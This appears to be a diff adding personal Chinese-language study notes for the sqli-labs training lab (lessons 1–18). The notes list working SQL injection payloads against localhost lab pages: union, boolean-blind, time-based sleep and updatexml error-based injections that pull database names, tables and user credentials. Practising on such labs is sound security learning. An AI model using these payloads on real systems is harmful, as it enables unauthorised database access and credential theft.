@@ -1,0 +1,171 @@
+查库： select schema_name from information_schema.schemata
+查表： select table_name from information_schema.tables where table_schema='security'
+查列： select column_name from information_schema.columns where table_name='users'
+查字段：select username,password from security.users
+
+
+less-01:
+SELECT * FROM users WHERE id='1' LIMIT 0,1;
+select SELECT 
+limit 0,1; 其中第一位是从第几个开始，比如0代表从第一个开始，而第二位的1代表的就是显示多少个数据。
+
+
+SELECT * FROM users WHERE id='1' or 1=1-- ' LIMIT 0,1
+--+ --  # 
+or and 
+A and B   True
+A or B  True True 
+id=1 
+SELECT * FROM users WHERE id='1''
+less-01
+数据中存在3列。
+
+
+system_user()
+user()
+current_user()
+database()
+version()
+@@datadir
+@@version_compile_os
+
+group_concat()
+concat_ws('~',A,B)
+A~B
+
+
+information_schema,challenges,mysql,performance_schema,security,test
+security
+emails,referers,uagents,users
+id,username,password
+
+
+group_concat(concat_ws(0x7e,username,password)) from security.users
+
+concat_ws(0x7e,username,password)    # admin~password,admin1~pass，
+
+'1'
+1
+('1')
+
+select ascii(substr((select database()),1,1));
+select database()   security
+select ascii(substr(security),1,1));
+select ascii('s')
+115
+
+burpsuite 使用： 代理
+security
+crow_1
+if length(select database()) =8;
+
+http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema = 0x7365637572697479 limit 1,1),1,1))> 10--+
+http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) >100--+ 
+http://127.0.0.1/sqli/Less-5/?id=1’ and  ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) >1000--+ 
+
+ascii(substr((select database()),1,1))> 156
+security
+二分法
+1，156
+100
+
+http://127.0.0.1/sqli/Less-5/?id=1' 
+and 
+ ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) > 10
+ 99
+ --+ 
+
+select if()
+select database()
+substr((select database()),1,1)
+ascii(substr((select database()),1,1))
+select if(ascii(substr((select database()),1,1)) > 10, 2,3);
+
+sqli-labs less01-less10 
+mysql 查询语句：
+
+查库： select schema_name from information_schema.schemata;
+查表： select table_name from information_schema.tables where table_schema='security';
+查列： select column_name from information_schema.columns where table_name='users';
+查字段： select username,password from security.users;
+
+less-11
+
+select 1=1 and 1=2; 
+select 1=1 or 1=2;
+uname=n'  union select 1, schema_name from information_schema.schemata  limit 1,1#&passwd=admin&submit=Submit
+uname=n'  union select 1, group_concat(schema_name) from information_schema.schemata #&passwd=admin&submit=Submit
+security
+uname=n'  union select 1, group_concat(table_name) from information_schema.tables where table_schema='security' #&passwd=admin&submit=Submit
+总结：
+less-1   get
+less-11  post 
+(1)
+
+'
+')
+'))
+"
+")
+"))
+select * from users where user_id = '1';
+select * from users where user_id = '1111 ' or 1=1 #
+select database();
+  group_concat(concat(0x7e,username,password)) from security.users
+  ~ 
+  username~password
+
+less-13
+select length(database());
+if()
+长度：if(length(database())>1,1,sleep(5));  数据库字符长度是8
+left(database(),1)='a'
+
+uname=ain') or left((select schema_name from information_schema.schemata limit 0,1),1)>'a' #&passwd=admin&submit=Submit  
+inf
+A-Z
+0_9
+_
+ 
+
+ less-14
+ uname=admin " or length(database())='8'#&passwd=admin&submit=Submit  
+ A or B 
+ A and B 
+
+uname=ain" or left((select schema_name from information_schema.schemata limit 0,1),1)='u' #&passwd=admin&submit=Submit 
+uname=adin " or left((select table_name from information_schema.tables where table_schema='security' limit 0,1),1)>'a'#&passwd=admin&submit=Submit  
+uname=adin " or left((select column_name from information_schema.columns where table_name='users' limit 0,1),1)='a'#&passwd=admin&submit=Submit  
+
+less-15 
+uname=admin&passwd=a' or length(database())='8'#&submit=Submit    
+
+less-16
+13   ('ain')
+14   "admin"
+15    'ain'
+16     ("admin") 
+uname=admin&passwd=admin") and 1=2#&submit=Submit    
+
+less-17
+uname=admin&passwd=afafa'#&submit=Submit
+select updatexml(1,concat(0x7e,(database())),1);
+select updatexml(1,concat(0x7e,(构造语句)),1);
+查库： select schema_name from information_schema.schemata;
+查表： select table_name from information_schema.tables where table_schema='security';
+查列： select column_name from information_schema.columns where table_name='users';
+查字段： select username,password from security.users;
+and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),1)
+and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security')),1)
+
+less-18
+INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('Mn.0', '127.0.0.1', 'admin')
+' or updatexml(1,concat(0x7e,()),1);
+select  updatexml(1,concat(0x7e,(database())),1);
+' or updatexml(1,concat(0x7e,(database())),1) or '1'='1
+' or updatexml(1,concat(0x7e,(database())),1), '','')# 
+' or updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),1), '','')# 
+' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1)),1), '','')# 
+' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1)),1), '','')# 
+' or updatexml(1,concat(0x7e,(select username from security.users limit 0,1)),1), '','')# 
+
